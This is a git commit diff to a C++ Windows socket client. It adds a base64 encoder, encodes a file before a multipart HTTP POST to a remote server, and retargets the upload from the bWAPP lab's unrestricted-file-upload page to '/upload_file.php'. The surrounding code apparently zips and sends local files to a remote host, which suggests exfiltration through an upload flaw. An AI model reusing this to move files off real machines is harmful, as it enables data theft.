902a0ca73b90f08fca953a40d3500dca1be0b7e1
YSJ <48110952+YSJXX@users.noreply.github.com>
2020-11-09 02:05:53 +0900

    add base64

--- stl/stl.cpp
+++ stl/stl.cpp
@@ -23,9 +23,57 @@
 //Zip
 #include "Zipper.h"
 
+
 #define MAXBUF 1024
 #define DATA_SIZE 1024*1024*10 //10MB
 #define MAXLINE 409600
+
+// base64 ~
+static const char b64chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+char* b64_encode(const unsigned char* in, size_t len)
+{
+	char* out;
+	size_t  elen,i,j,v;
+	
+	if (in == NULL || len == 0)
+		return NULL;
+
+	//encoded_size = elen
+	elen = len;
+	if (len % 3 != 0)
+		elen += 3 - (len % 3);
+	elen /= 3;
+	elen *= 4;
+
+	out = (char*)malloc(elen + 1);
+	out[elen] = '\0';
+
+	for (i = 0, j = 0; i < len; i += 3, j += 4) {
+		v = in[i];
+		v = i + 1 < len ? v << 8 | in[i + 1] : v << 8;
+		v = i + 2 < len ? v << 8 | in[i + 2] : v << 8;
+
+		out[j] = b64chars[(v >> 18) & 0x3F];
+		out[j + 1] = b64chars[(v >> 12) & 0x3F];
+		if (i + 1 < len) {
+			out[j + 2] = b64chars[(v >> 6) & 0x3F];
+		}
+		else {
+			out[j + 2] = '=';
+		}
+		if (i + 2 < len) {
+			out[j + 3] = b64chars[v & 0x3F];
+		}
+		else {
+			out[j + 3] = '=';
+		}
+	}
+
+	return out;
+}
+
+// ~ base64
 
 int makeSocket(char* server_ip) {
 	WSADATA wsaData;
@@ -88,6 +136,9 @@ void send_file(char* server_ip, const char* fileDir, const char* filename)
 		exit(1);
 	}
 
+	fileBuf = b64_encode((const unsigned char*)fileBuf, file_size);
+	file_size = strlen(fileBuf);
+	
 	// make body --------------------------
 	sprintf(pre_body1, "--%s\r\n" //boundary	
 		"Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
@@ -116,7 +167,7 @@ void send_file(char* server_ip, const char* fileDir, const char* filename)
 	memcpy(body + pre_len1 + file_size + pre_len2, post_body, post_len);
 
 	//make header--------------------------
-	sprintf(packet_header, "POST /bWAPP/unrestricted_file_upload.php HTTP/1.1\r\n"
+	sprintf(packet_header, "POST /upload_file.php HTTP/1.1\r\n"
 		"Host: %s\r\n"
 		"Connection: keep-alive\r\n"
 		"Content-Length: %d\r\n"
